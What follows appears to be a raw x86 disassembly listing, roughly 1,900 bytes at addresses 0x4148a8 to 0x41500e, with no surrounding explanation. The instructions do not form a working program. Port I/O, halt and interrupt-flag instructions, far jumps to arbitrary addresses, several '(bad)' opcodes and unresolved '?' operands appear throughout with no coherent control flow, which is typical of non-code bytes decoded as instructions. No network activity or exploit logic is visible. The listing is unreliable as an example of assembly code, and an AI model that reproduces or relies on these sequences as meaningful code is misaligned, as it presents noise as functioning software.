  4148a8:	mov    eax,ds:0x6bdea53b
  4148ad:	jp     0x4148fa
  4148af:	add    al,0xab
  4148b1:	add    BYTE PTR ss:[eax+0x70],0xb6
  4148b6:	mov    bh,0x3b
  4148b8:	fs mov eax,0xd4747cdc
  4148be:	aad    0x38
  4148c0:	and    DWORD PTR [ebx+0x31],ebp
  4148c3:	data16 div BYTE PTR [esi]
  4148c6:	sbb    ch,BYTE PTR [ebp+esi*8-0x71]
  4148ca:	mov    WORD PTR [ecx+0x50],gs
  4148cd:	xor    DWORD PTR [esi],ebp
  4148cf:	push   ebp
  4148d0:	push   0x559fb538
  4148d5:	mov    ch,BYTE PTR [esi+0x6ecddda4]
  4148db:	push   edi
  4148dc:	mov    ?,WORD PTR [eax]
  4148de:	pop    ecx
  4148df:	xchg   dh,dh
  4148e1:	test   DWORD PTR [ecx],edi
  4148e3:	cmp    ecx,ebx
  4148e5:	push   edx
  4148e6:	mov    dh,0x96
  4148e8:	dec    esi
  4148e9:	and    DWORD PTR [edx+0x3f],eax
  4148ec:	mov    ebp,0xf59254dd
  4148f1:	mov    dh,cl
  4148f3:	loope  0x414961
  4148f5:	out    dx,al
  4148f6:	add    dh,cl
  4148f8:	outs   dx,DWORD PTR ds:[esi]
  4148f9:	cmp    ch,cl
  4148fb:	sbb    eax,0x6f25ed6d
  414900:	xor    eax,0xf50d3b90
  414905:	mov    esi,0x8c3b1c69
  41490a:	dec    edi
  41490b:	lahf   
  41490c:	sub    BYTE PTR [eax-0x5597c75f],al
  414912:	and    al,0xf5
  414914:	pop    eax
  414915:	lahf   
  414916:	scas   eax,DWORD PTR es:[edi]
  414917:	es cmc 
  414919:	adc    al,0xd3
  41491b:	retf   0xc36b
  41491e:	xchg   edi,eax
  41491f:	or     dl,BYTE PTR [eax+0xf2813b]
  414925:	push   0x6e
  414927:	mov    ds:0x9f6e1e14,eax
  41492c:	sub    BYTE PTR [esi],0x0
  41492f:	add    eax,0x38f70b3f
  414934:	xchg   esp,eax
  414935:	pop    esp
  414936:	in     eax,0x90
  414938:	lock cld 
  41493a:	push   esi
  41493b:	inc    ecx
  41493c:	jl     0x414910
  41493e:	sub    DWORD PTR [ebp-0x6f],0xffffffd1
  414942:	out    dx,eax
  414943:	scas   eax,DWORD PTR es:[edi]
  414944:	adc    ch,BYTE PTR [edi-0xe]
  414947:	stc    
  414948:	test   eax,0xf9345c01
  41494d:	jmp    0x414913
  41494f:	out    0xf5,al
  414951:	mov    ds:0x34a1159,al
  414956:	outs   dx,BYTE PTR ds:[esi]
  414957:	sar    BYTE PTR [ecx+0x6b6f2c04],0x1e
  41495e:	pop    ds
  41495f:	cmp    DWORD PTR [ebp+0x15011d0],edi
  414965:	mov    ds:0x8bf5b1ef,eax
  41496a:	in     eax,0x5e
  41496c:	lahf   
  41496d:	std    
  41496e:	dec    edi
  41496f:	nop
  414970:	sub    BYTE PTR [eax],bh
  414972:	imul   ebp,DWORD PTR [edi],0x1a
  414975:	and    al,0x47
  414977:	es xor eax,0xee4a7d66
  41497d:	retf   0xf91e
  414980:	cmp    al,0xcf
  414982:	mov    bh,0xec
  414984:	int3   
  414985:	cmp    esi,DWORD PTR [esp+ecx*2]
  414988:	xchg   ebx,eax
  414989:	and    eax,0x21f66088
  41498e:	outs   dx,DWORD PTR ds:[esi]
  41498f:	ja     0x414955
  414991:	mov    ah,0x89
  414993:	inc    esp
  414994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414995:	bound  ebx,QWORD PTR [ebp+0x39]
  414998:	add    BYTE PTR [esi-0x3bb3b5ed],cl
  41499e:	das    
  41499f:	imul   esi,ebp,0x2b13cf80
  4149a5:	js     0x41498e
  4149a7:	test   eax,0xf7603b86
  4149ac:	loopne 0x414a13
  4149ae:	sbb    DWORD PTR [eax-0x7c],eax
  4149b1:	sbb    ebp,DWORD PTR [eax+0x32]
  4149b4:	cmp    ebp,esp
  4149b6:	loope  0x4149c8
  4149b8:	leave  
  4149b9:	jnp    0x414966
  4149bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149bc:	icebp  
  4149bd:	cmp    esi,DWORD PTR [ecx+0x53]
  4149c0:	pop    edx
  4149c1:	into   
  4149c2:	jle    0x414961
  4149c4:	push   edi
  4149c5:	mov    al,ds:0x9de45c56
  4149ca:	test   dh,bh
  4149cc:	aad    0xfb
  4149ce:	fisub  WORD PTR [edi+0x2b99f954]
  4149d4:	mov    edx,0xd74a9d43
  4149d9:	aas    
  4149da:	xor    BYTE PTR [esi],ch
  4149dc:	aad    0x25
  4149de:	stos   DWORD PTR es:[edi],eax
  4149df:	cdq    
  4149e0:	cmc    
  4149e1:	xchg   ebx,eax
  4149e2:	fdiv   st(5),st
  4149e4:	dec    esi
  4149e5:	xchg   ebp,eax
  4149e6:	adc    BYTE PTR [ecx-0x4c36c714],cl
  4149ec:	adc    edx,DWORD PTR [edx+0x4d]
  4149ef:	fs cs pop ds
  4149f2:	popf   
  4149f3:	inc    ecx
  4149f4:	sbb    al,0x7d
  4149f6:	xchg   BYTE PTR [eax-0x55],dh
  4149f9:	mov    dh,0xe9
  4149fb:	sub    ch,dh
  4149fd:	aam    0x82
  4149ff:	adc    BYTE PTR [ebp+0x65],dh
  414a02:	xchg   ebp,eax
  414a03:	je     0x414a1f
  414a05:	sar    BYTE PTR [ecx+0x2b],cl
  414a08:	imul   ebx,DWORD PTR [edi],0x94789b6e
  414a0e:	add    eax,0x1e3bd821
  414a13:	adc    DWORD PTR [esi-0x28606a76],ebp
  414a19:	and    DWORD PTR [esi+0x7db80eeb],ebp
  414a1f:	xchg   edi,eax
  414a20:	dec    edi
  414a21:	sbb    bh,BYTE PTR [esi-0x7b]
  414a24:	fdivr  DWORD PTR [ebx]
  414a26:	loop   0x414a51
  414a28:	test   ch,al
  414a2a:	test   BYTE PTR [edi+0x3e],al
  414a2d:	shr    BYTE PTR [esi-0x72],1
  414a30:	xchg   ebp,eax
  414a31:	outs   dx,DWORD PTR ds:[esi]
  414a32:	or     BYTE PTR [eax+0x3e664070],dh
  414a38:	push   esp
  414a39:	adc    eax,DWORD PTR [ebp+0x70]
  414a3c:	rol    BYTE PTR [edi],cl
  414a3e:	sti    
  414a3f:	ins    BYTE PTR es:[edi],dx
  414a40:	repnz shr BYTE PTR [esi+0x33],0xdb
  414a45:	data16 mov al,0xee
  414a48:	data16 mov dl,0x6a
  414a4b:	aas    
  414a4c:	jnp    0x414a22
  414a4e:	or     ecx,edi
  414a50:	out    dx,al
  414a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a52:	out    dx,al
  414a53:	xchg   edx,eax
  414a54:	mov    dh,0x77
  414a56:	lods   al,BYTE PTR ds:[esi]
  414a57:	inc    ebx
  414a58:	out    dx,eax
  414a59:	mov    ebx,0x917ea552
  414a5e:	push   esp
  414a5f:	inc    edi
  414a60:	mov    eax,ds:0x1638ad83
  414a65:	jns    0x414ac4
  414a67:	inc    ebx
  414a68:	pop    edx
  414a69:	xor    al,0xd
  414a6b:	mov    esi,0x3db18ee8
  414a70:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  414a72:	lea    esp,[eax+0x38e51793]
  414a78:	adc    DWORD PTR ds:0xdd2f3e86,esi
  414a7e:	sub    BYTE PTR [edx-0xb],ch
  414a81:	loop   0x414a45
  414a83:	in     al,dx
  414a84:	jne    0x414aec
  414a86:	mov    ds:0x56abac1a,al
  414a8b:	push   edi
  414a8c:	aam    0x3b
  414a8e:	xor    ah,ah
  414a90:	inc    ecx
  414a91:	sti    
  414a92:	popf   
  414a93:	ror    BYTE PTR [ebx-0x21fc91f4],0x1c
  414a9a:	mov    dh,0xa4
  414a9c:	xchg   esp,eax
  414a9d:	hlt    
  414a9e:	es cmc 
  414aa0:	mov    DWORD PTR [eax-0x21],ebx
  414aa3:	sub    ah,BYTE PTR ds:0x10026ddc
  414aa9:	cmp    eax,0x7a0ab627
  414aae:	xchg   esp,eax
  414aaf:	pcmpeqw mm4,QWORD PTR [edi+esi*2-0x18]
  414ab4:	sub    bh,BYTE PTR [eax]
  414ab6:	test   eax,0xcfa842cb
  414abb:	fistp  QWORD PTR [ecx-0x16]
  414abe:	dec    esi
  414abf:	inc    ebp
  414ac0:	cmc    
  414ac1:	mov    eax,ds:0x915ae388
  414ac6:	in     al,0x85
  414ac8:	mov    ecx,0x1594721
  414acd:	pop    esi
  414ace:	or     al,0x39
  414ad0:	jno    0x414ac1
  414ad2:	retf   0xa084
  414ad5:	popf   
  414ad6:	sti    
  414ad7:	dec    ebp
  414ad8:	popf   
  414ad9:	mov    esp,0xd5c8246e
  414ade:	or     DWORD PTR [ebx-0x5e993d39],0x59273852
  414ae8:	inc    eax
  414ae9:	sub    BYTE PTR [eax-0x4a],ch
  414aec:	hlt    
  414aed:	out    0x6e,al
  414aef:	lock ret 0x631f
  414af3:	out    0xed,al
  414af5:	rcr    BYTE PTR [eax+edi*4-0x7f],1
  414af9:	ds retf 
  414afb:	pop    esi
  414afc:	xor    ebp,DWORD PTR [esi+0x6d66794c]
  414b02:	sti    
  414b03:	test   eax,0x1ae19df5
  414b08:	pop    eax
  414b09:	sub    ah,BYTE PTR [eax+0x2d380d84]
  414b0f:	popw   ds
  414b11:	cmp    bl,BYTE PTR [ebp-0x46]
  414b14:	sub    al,0xd1
  414b16:	jecxz  0x414af6
  414b18:	cmc    
  414b19:	ror    BYTE PTR [ebx-0xe],cl
  414b1c:	ror    BYTE PTR [esi-0x73],cl
  414b1f:	enter  0x25ab,0xf0
  414b23:	cmp    BYTE PTR [eax-0x1dc33fea],bh
  414b29:	add    DWORD PTR [esi+eiz*2-0xb],eax
  414b2d:	aad    0x2f
  414b2f:	fdiv   QWORD PTR [eax-0x19c15197]
  414b35:	xor    DWORD PTR [eax+0x41],ebx
  414b38:	add    eax,0xb773e12f
  414b3d:	jp     0x414bb4
  414b3f:	inc    edx
  414b40:	mov    ss,WORD PTR [edi+0x26]
  414b43:	in     al,0xf5
  414b45:	inc    ecx
  414b46:	push   0x57a97305
  414b4b:	sahf   
  414b4c:	fst    QWORD PTR [ecx-0x77]
  414b4f:	mov    ds:0x88c40f4b,eax
  414b55:	lods   eax,DWORD PTR ds:[esi]
  414b56:	out    dx,al
  414b57:	mov    bl,0xba
  414b59:	jg     0x414bd8
  414b5b:	xchg   edx,ebp
  414b5d:	shl    BYTE PTR [ebx+0x365ac5c6],cl
  414b63:	mov    bh,0x25
  414b65:	cmp    eax,0xaec5fb6
  414b6a:	pop    ds
  414b6b:	test   esp,edx
  414b6d:	cmp    ebp,DWORD PTR ds:0x1ec3464e
  414b73:	enter  0xaf5,0xbf
  414b77:	pop    esi
  414b78:	out    0xff,al
  414b7a:	stc    
  414b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b7c:	ret    
  414b7d:	push   ebp
  414b7e:	outs   dx,BYTE PTR ds:[esi]
  414b7f:	ss ins BYTE PTR es:[edi],dx
  414b81:	sbb    dl,al
  414b83:	test   al,0xf6
  414b85:	cmp    DWORD PTR [ecx+0x1],eax
  414b88:	push   ebx
  414b89:	sti    
  414b8a:	fs daa 
  414b8c:	test   BYTE PTR [ecx+0x4f],dl
  414b8f:	mov    esi,0x346862c1
  414b94:	inc    ebx
  414b95:	pop    esp
  414b96:	dec    edx
  414b97:	pop    esi
  414b98:	and    bh,BYTE PTR [esi+ecx*4]
  414b9b:	and    eax,0xbf653b5c
  414ba0:	out    0xa6,eax
  414ba2:	(bad)  
  414ba4:	je     0x414bf6
  414ba6:	or     al,0xca
  414ba8:	jmp    0x1b894a2b
  414bad:	mov    dh,0xef
  414baf:	xor    dh,BYTE PTR [ecx+0x69]
  414bb2:	cmp    bl,BYTE PTR [bx+di]
  414bb5:	cmp    BYTE PTR [ebp+ebx*2+0x5f749697],ah
  414bbc:	pop    esi
  414bbd:	inc    ecx
  414bbe:	outs   dx,DWORD PTR ds:[esi]
  414bbf:	enter  0x4943,0x28
  414bc3:	jmp    0x7e4f:0x38849f5f
  414bca:	or     eax,0xc463ea82
  414bcf:	xchg   ebp,eax
  414bd0:	cmc    
  414bd1:	ins    DWORD PTR es:[edi],dx
  414bd2:	jne    0x414c27
  414bd4:	(bad)  
  414bd5:	ss pop edi
  414bd7:	jmp    DWORD PTR [ecx+ecx*1-0x4a]
  414bdb:	inc    ebx
  414bdc:	pop    ss
  414bdd:	dec    ebx
  414bde:	scas   eax,DWORD PTR es:[edi]
  414bdf:	xchg   DWORD PTR [eax],esp
  414be1:	xor    al,0xfc
  414be3:	inc    eax
  414be4:	cmc    
  414be5:	stos   BYTE PTR es:[edi],al
  414be6:	sbb    BYTE PTR [ecx+0x33],cl
  414be9:	pop    ss
  414bea:	xchg   ebp,eax
  414beb:	dec    ebx
  414bec:	(bad)  
  414bed:	xor    BYTE PTR [ebx+0x5494cae7],ch
  414bf3:	cmp    esp,esi
  414bf5:	adc    eax,0xfccd2b1a
  414bfa:	outs   dx,BYTE PTR ds:[esi]
  414bfb:	fadd   DWORD PTR [ecx+eiz*8+0x44bf1d95]
  414c02:	(bad)  
  414c03:	cmp    BYTE PTR [eax+0x3145b2fd],dl
  414c09:	fiadd  DWORD PTR [esi+eiz*4+0x44e3bef5]
  414c10:	jne    0x414c00
  414c12:	dec    esi
  414c13:	js     0x414c8f
  414c15:	xor    DWORD PTR [eax],ecx
  414c17:	enter  0x2a13,0x83
  414c1b:	pop    eax
  414c1c:	(bad)  
  414c1d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c1f:	inc    edi
  414c20:	cmc    
  414c21:	lods   al,BYTE PTR ds:[esi]
  414c22:	adc    DWORD PTR [esp+edx*1],0xffffffdc
  414c26:	test   eax,0x8b387079
  414c2b:	scas   eax,DWORD PTR es:[edi]
  414c2c:	mov    ds:0xf311f50b,eax
  414c31:	sub    DWORD PTR [esi+0x15],0xffffffe3
  414c35:	setl   bl
  414c38:	loop   0x414cb5
  414c3a:	cmp    bh,BYTE PTR [edi+edi*4]
  414c3d:	mov    DWORD PTR [ebx+0x6744a3e3],esp
  414c43:	scas   eax,DWORD PTR es:[edi]
  414c44:	fwait
  414c45:	cmc    
  414c46:	jl     0x414c61
  414c48:	out    0xe,eax
  414c4a:	idiv   BYTE PTR [eax-0x6e3c77b2]
  414c50:	add    BYTE PTR [eax],bh
  414c52:	sub    ah,BYTE PTR [edi]
  414c54:	fsubr  QWORD PTR [ebp-0x57da97a2]
  414c5a:	outs   dx,BYTE PTR ds:[esi]
  414c5b:	ins    DWORD PTR es:[edi],dx
  414c5c:	pop    edi
  414c5d:	arpl   WORD PTR [edx+0x6f],bx
  414c60:	mov    ecx,DWORD PTR ds:0xe3affb33
  414c66:	pop    cx
  414c68:	mov    ebx,0x57f8ab3b
  414c6d:	lock cwde 
  414c6f:	mov    eax,ds:0x51ecf73
  414c74:	in     al,0xbf
  414c76:	mov    ds:0xa148d507,eax
  414c7b:	mov    eax,0x8487a8d2
  414c80:	push   ebp
  414c81:	cmp    al,0x5
  414c83:	iret   
  414c84:	call   0xf5bb1d07
  414c89:	push   edi
  414c8a:	xor    al,BYTE PTR [ebp-0x5f]
  414c8d:	imul   ebp,DWORD PTR [edi+0x1],0xffffffe1
  414c91:	mov    esi,0x672d21b1
  414c96:	leave  
  414c97:	cmp    dh,BYTE PTR [edi]
  414c99:	xor    DWORD PTR [ecx+0x22],esi
  414c9c:	pushf  
  414c9d:	pop    esp
  414c9e:	popa   
  414c9f:	stc    
  414ca0:	js     0x414c48
  414ca2:	sub    ebp,edx
  414ca4:	popf   
  414ca5:	xor    BYTE PTR [esi-0x5b],ch
  414ca8:	popa   
  414ca9:	fwait
  414caa:	mov    ah,ch
  414cac:	or     eax,0x51393b92
  414cb1:	loopne 0x414cbf
  414cb3:	push   cs
  414cb4:	push   eax
  414cb5:	mov    ds:0x6fe89315,al
  414cba:	sbb    al,0x4b
  414cbc:	outs   dx,DWORD PTR ds:[esi]
  414cbd:	pop    esi
  414cbe:	daa    
  414cbf:	dec    ecx
  414cc0:	cmp    BYTE PTR [ebx+0x17aefa40],ah
  414cc6:	push   0x8d043a0
  414ccb:	mov    edx,0x69cf4137
  414cd0:	inc    BYTE PTR [ebp-0x185ab392]
  414cd6:	je     0x414c6c
  414cd8:	fldln2 
  414cda:	test   DWORD PTR [eax],edi
  414cdc:	jle    0x414c64
  414cde:	cdq    
  414cdf:	imul   ebx,DWORD PTR [edx+0x2d1c469b],0x56
  414ce6:	mov    edx,0x3fd38938
  414ceb:	pop    esp
  414cec:	sahf   
  414ced:	push   es
  414cee:	pop    eax
  414cef:	cmp    DWORD PTR ds:0x3c8a4e43,edi
  414cf5:	mov    eax,0xb53f9523
  414cfa:	in     eax,0xb8
  414cfc:	aas    
  414cfd:	inc    ebp
  414cfe:	add    al,BYTE PTR [esi]
  414d00:	ss pop edx
  414d02:	xchg   ebp,eax
  414d03:	cmp    BYTE PTR [eax],dh
  414d05:	push   ebp
  414d06:	or     al,cl
  414d08:	sbb    dl,ch
  414d0a:	(bad)  
  414d0b:	sbb    eax,0x6adebaf5
  414d10:	test   dh,dl
  414d12:	test   al,0x32
  414d14:	nop
  414d15:	cmp    eax,DWORD PTR [esi]
  414d17:	(bad)  
  414d18:	lea    ecx,[edi]
  414d1a:	imul   eax,DWORD PTR [edx],0x54
  414d1d:	mov    esp,0xe111fb6e
  414d22:	popf   
  414d23:	cmp    al,0x16
  414d25:	dec    edx
  414d26:	mov    al,0x38
  414d28:	imul   esi,DWORD PTR [edi-0x24],0x1
  414d2c:	ror    bl,cl
  414d2e:	xchg   edx,eax
  414d2f:	aam    0x3f
  414d31:	in     eax,0x39
  414d33:	cli    
  414d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d35:	cmp    ebp,DWORD PTR [ebx+edx*1+0x7a9a6ee3]
  414d3c:	sar    BYTE PTR [edi],1
  414d3e:	and    eax,0x459b0e79
  414d43:	mov    ecx,0x69aa1b67
  414d48:	loope  0x414d23
  414d4a:	sbb    ah,bh
  414d4c:	outs   dx,DWORD PTR ds:[esi]
  414d4d:	ds std 
  414d4f:	cmp    BYTE PTR [ebx-0x1550f48d],dh
  414d55:	jl     0x414dc1
  414d57:	ins    BYTE PTR es:[edi],dx
  414d58:	adc    al,0xa7
  414d5a:	popf   
  414d5b:	sub    dl,bl
  414d5d:	int3   
  414d5e:	out    dx,al
  414d5f:	loope  0x414cfb
  414d61:	ror    dh,1
  414d63:	add    esp,esi
  414d65:	cmp    edi,DWORD PTR [ebp+0x20]
  414d68:	aam    0x2b
  414d6a:	into   
  414d6b:	inc    edi
  414d6c:	xor    BYTE PTR [ebx+0x3797516e],0x87
  414d73:	pop    eax
  414d74:	mov    esi,0x31016179
  414d79:	outs   dx,BYTE PTR ds:[esi]
  414d7a:	aas    
  414d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d7c:	add    esi,DWORD PTR [ecx]
  414d7e:	xchg   ebx,eax
  414d7f:	add    DWORD PTR [ecx-0x7d],ecx
  414d82:	cmc    
  414d83:	cdq    
  414d84:	jae    0x414d6f
  414d86:	jae    0x414dcc
  414d88:	sub    BYTE PTR [eax+0x67],cl
  414d8b:	mov    ds:0xf6d969f5,al
  414d90:	aaa    
  414d91:	and    DWORD PTR [edi+ebx*1+0x74],esp
  414d95:	shr    BYTE PTR [ebx-0x4f],0xf5
  414d99:	bound  eax,QWORD PTR [ecx]
  414d9b:	cdq    
  414d9c:	and    DWORD PTR [ebx-0x16],esi
  414d9f:	xchg   ebx,eax
  414da0:	cmc    
  414da1:	add    eax,0xb370e763
  414da6:	call   0x4c7963a7
  414dab:	pop    esp
  414dac:	xor    eax,0x87ba983a
  414db1:	adc    ebp,DWORD PTR [esi-0xd]
  414db4:	mov    ebp,DWORD PTR [eax]
  414db6:	test   BYTE PTR [esi],al
  414db8:	jnp    0x414d44
  414dba:	mov    DWORD PTR [eax-0x266ecf45],ebp
  414dc0:	pusha  
  414dc1:	xor    DWORD PTR [eax+ecx*1-0x57549722],ebx
  414dc8:	cmc    
  414dc9:	iret   
  414dca:	imul   edx,DWORD PTR [ebp-0x49eb566d],0x57423bc1
  414dd4:	(bad)  
  414dd5:	mov    ds:0xfee7e86c,al
  414dda:	jb     0x414e04
  414ddc:	mov    al,0xca
  414dde:	retf   0xd8e0
  414de1:	cmp    ecx,DWORD PTR [ebx-0x57]
  414de4:	jg     0x414dd7
  414de6:	add    BYTE PTR [ebx+0x27],al
  414de9:	outs   dx,WORD PTR ds:[esi]
  414deb:	and    ah,bl
  414ded:	sub    esi,DWORD PTR [edx+0x449ef1b4]
  414df3:	cmp    DWORD PTR [edx],ecx
  414df5:	add    BYTE PTR ds:0x766a3655,bh
  414dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dfc:	loopne 0x414de9
  414dfe:	call   0x79f9967b
  414e03:	cwde   
  414e04:	scas   eax,DWORD PTR es:[edi]
  414e05:	ds ins DWORD PTR es:[edi],dx
  414e07:	cmp    DWORD PTR [ecx-0x79],edi
  414e0a:	cmp    al,0x90
  414e0c:	loope  0x414da1
  414e0e:	(bad)  
  414e0f:	jo     0x414dd8
  414e11:	mov    dh,0xe4
  414e13:	test   ch,dh
  414e15:	jl     0x414df3
  414e17:	mov    ss,WORD PTR [eax+0x51]
  414e1a:	add    al,0x1a
  414e1c:	xchg   ebx,eax
  414e1d:	cmp    eax,0x21abe68a
  414e22:	sbb    ch,0xd5
  414e25:	adc    DWORD PTR [ebp-0x3ef40ada],ecx
  414e2b:	jnp    0x414ddb
  414e2d:	outs   dx,DWORD PTR ds:[esi]
  414e2e:	push   cs
  414e2f:	xchg   ecx,eax
  414e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e31:	call   0x2a34d1d8
  414e36:	outs   dx,DWORD PTR ds:[esi]
  414e37:	pop    ecx
  414e38:	sub    BYTE PTR [edx],bh
  414e3a:	ret    0x7d68
  414e3d:	cmp    BYTE PTR [edi+0x1e328c9c],dl
  414e43:	and    al,0x2a
  414e45:	lahf   
  414e46:	outs   dx,BYTE PTR ds:[esi]
  414e47:	int    0xe5
  414e49:	ins    DWORD PTR es:[edi],dx
  414e4a:	loop   0x414ebe
  414e4c:	ins    BYTE PTR es:[edi],dx
  414e4d:	ins    BYTE PTR es:[edi],dx
  414e4e:	mov    esp,0xf6a1c938
  414e53:	pop    edx
  414e54:	mov    ch,0x46
  414e56:	dec    edi
  414e57:	xchg   edi,eax
  414e58:	adc    eax,DWORD PTR [esi+0x7bf5b875]
  414e5e:	loope  0x414ed4
  414e60:	xchg   edi,eax
  414e61:	out    0xeb,al
  414e63:	cmp    ah,al
  414e65:	stos   DWORD PTR es:[edi],eax
  414e66:	add    eax,0x74ea67a5
  414e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e6c:	xor    DWORD PTR [ebp-0x4571c72c],eax
  414e72:	mov    WORD PTR [ebx+0x387cd0bf],?
  414e78:	xor    ecx,DWORD PTR [ebx+0x472f0e37]
  414e7e:	ja     0x414e4a
  414e80:	cmc    
  414e81:	out    dx,eax
  414e82:	pop    edx
  414e83:	std    
  414e84:	jbe    0x414e0a
  414e86:	or     BYTE PTR [esi+0xfb23804],0x62
  414e8d:	fist   WORD PTR [edx]
  414e8f:	outs   dx,DWORD PTR ds:[esi]
  414e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e91:	in     eax,dx
  414e92:	lea    ebx,[ebx+0x7c]
  414e95:	popf   
  414e96:	scas   al,BYTE PTR es:[edi]
  414e97:	cmc    
  414e98:	push   esi
  414e99:	and    al,BYTE PTR [edx+eax*1]
  414e9c:	sub    eax,0xf51964e6
  414ea1:	stos   DWORD PTR es:[edi],eax
  414ea2:	loope  0x414ecf
  414ea4:	es sub cl,dl
  414ea7:	stc    
  414ea8:	cmc    
  414ea9:	push   ebx
  414eaa:	mov    bl,0xef
  414eac:	mov    cl,0xb5
  414eae:	xchg   ebx,eax
  414eaf:	mov    ds:0x56a13808,eax
  414eb4:	inc    ebp
  414eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eb6:	add    BYTE PTR [eax-0x2e],ch
  414eb9:	and    ebp,DWORD PTR [edi+0x7d]
  414ebc:	sbb    eax,0xc3d59f11
  414ec1:	adc    eax,0x91d6393a
  414ec6:	xor    BYTE PTR [eax],0xc6
  414ec9:	push   esi
  414eca:	pop    edx
  414ecb:	(bad)  
  414ecc:	call   0xb445034e
  414ed1:	lock dec esi
  414ed3:	mov    ecx,0xd9012b84
  414ed8:	jmp    FWORD PTR [ecx-0x6a]
  414edb:	js     0x414ee2
  414edd:	cld    
  414ede:	jno    0x414e68
  414ee0:	pop    ds
  414ee1:	out    dx,eax
  414ee2:	out    0x38,eax
  414ee4:	xchg   esp,eax
  414ee5:	fwait
  414ee6:	xor    al,BYTE PTR [ecx]
  414ee8:	imul   edi,DWORD PTR [ebx],0x9c54b25d
  414eee:	push   0xc2ab8653
  414ef3:	fsubp  st(0),st
  414ef5:	inc    eax
  414ef6:	test   DWORD PTR [eax-0x30],esi
  414ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414efa:	into   
  414efb:	or     BYTE PTR [ebx+0x36],0x95
  414eff:	cmp    dh,dh
  414f01:	inc    ebx
  414f02:	repnz and BYTE PTR [ecx+0x50],cl
  414f06:	mov    ch,0x47
  414f08:	adc    al,0x2f
  414f0a:	outs   dx,BYTE PTR ds:[esi]
  414f0b:	lods   al,BYTE PTR ds:[esi]
  414f0c:	jne    0x414ee5
  414f0e:	out    dx,al
  414f0f:	push   ss
  414f10:	js     0x414f6d
  414f12:	(bad)  
  414f13:	xor    eax,DWORD PTR [esp+esi*1-0x39]
  414f17:	jge    0x414ee4
  414f19:	sti    
  414f1a:	inc    esp
  414f1b:	mov    dh,0xba
  414f1d:	or     DWORD PTR [esi+0x2e],ebp
  414f20:	(bad)
  414f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f25:	jecxz  0x414ecb
  414f27:	cmp    BYTE PTR [ecx+0x17733cbb],dl
  414f2d:	(bad)  
  414f2e:	hlt    
  414f2f:	add    edx,DWORD PTR [ebp-0xa0261b1]
  414f35:	iret   
  414f36:	pop    ss
  414f37:	psubusb mm4,mm1
  414f3a:	dec    edi
  414f3b:	out    0xd7,al
  414f3d:	sub    ebp,edx
  414f3f:	cmp    BYTE PTR [ecx-0x7d959cfe],dh
  414f45:	dec    DWORD PTR [edx]
  414f47:	outs   dx,BYTE PTR ds:[esi]
  414f48:	cmc    
  414f49:	(bad)  
  414f4a:	xchg   ebx,eax
  414f4b:	int    0xbc
  414f4d:	outs   dx,DWORD PTR ds:[esi]
  414f4e:	gs push edx
  414f50:	in     al,0x38
  414f52:	aad    0x27
  414f54:	push   edi
  414f55:	or     bh,BYTE PTR ds:0x9cafb078
  414f5b:	sub    BYTE PTR ds:0x43c6eb9,al
  414f61:	jecxz  0x414f36
  414f63:	das    
  414f64:	dec    esp
  414f65:	and    al,0x42
  414f67:	cmp    DWORD PTR [ebx],esi
  414f69:	ret    
  414f6a:	leave  
  414f6b:	cwde   
  414f6c:	or     ah,BYTE PTR [esi]
  414f6e:	cmp    al,cl
  414f70:	cmc    
  414f71:	pop    es
  414f72:	aas    
  414f73:	iret   
  414f74:	inc    eax
  414f75:	nop
  414f76:	cwde   
  414f77:	mov    ebx,edx
  414f79:	cmp    edx,DWORD PTR [edx+0x51ce18d3]
  414f7f:	shl    DWORD PTR ds:0x68be6e06,cl
  414f85:	mov    esp,DWORD PTR [ecx+ebx*2+0x3e]
  414f89:	mov    ch,0x26
  414f8b:	iret   
  414f8c:	and    edi,DWORD PTR [eax]
  414f8e:	test   eax,0x6a5b5572
  414f93:	xchg   edx,eax
  414f94:	or     BYTE PTR [ecx+ebp*2-0xc2a997a],bh
  414f9b:	stos   BYTE PTR es:[edi],al
  414f9c:	xchg   edx,eax
  414f9d:	dec    ebx
  414f9e:	mov    ebp,0x3b3849e0
  414fa3:	fbstp  TBYTE PTR [eax-0x242c3ea0]
  414fa9:	pushf  
  414faa:	outs   dx,BYTE PTR ds:[esi]
  414fab:	mov    dl,0x16
  414fad:	nop
  414fae:	xor    al,0x86
  414fb0:	fcom   DWORD PTR [ecx+0x68]
  414fb3:	cmp    BYTE PTR [ecx-0x7575b050],ch
  414fb9:	cmp    BYTE PTR [eax],0xa1
  414fbc:	repz xor al,0x5c
  414fbf:	pop    ss
  414fc0:	jl     0x414f83
  414fc2:	sbb    BYTE PTR [ebx],0xea
  414fc5:	call   0xa948:0x664f316e
  414fcc:	cmp    BYTE PTR [eax],bh
  414fce:	add    eax,0x759c6719
  414fd3:	mov    eax,ds:0x4482daf2
  414fd8:	adc    dl,BYTE PTR [ebx+0x2f]
  414fdb:	(bad)  
  414fdd:	arpl   bp,di
  414fdf:	inc    esi
  414fe0:	inc    ebp
  414fe1:	cmp    BYTE PTR [edx+0x63],ch
  414fe4:	adc    BYTE PTR [ebx-0x20],al
  414fe7:	aaa    
  414fe8:	mov    ecx,0x24d1ac83
  414fed:	mov    eax,0xee48b2ac
  414ff2:	(bad)  
  414ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ff4:	ja     0x41502e
  414ff6:	mov    al,0xf0
  414ff8:	ror    BYTE PTR [eax-0x2f562a36],0x6e
  414fff:	dec    ebp
  415000:	push   ebx
  415001:	jp     0x414fbd
  415003:	rol    DWORD PTR es:[eax-0x5],cl
  415007:	and    eax,0xb3b391ff
  41500c:	inc    eax
  41500d:	stos   BYTE PTR es:[edi],al
  41500e:	pop    ebp
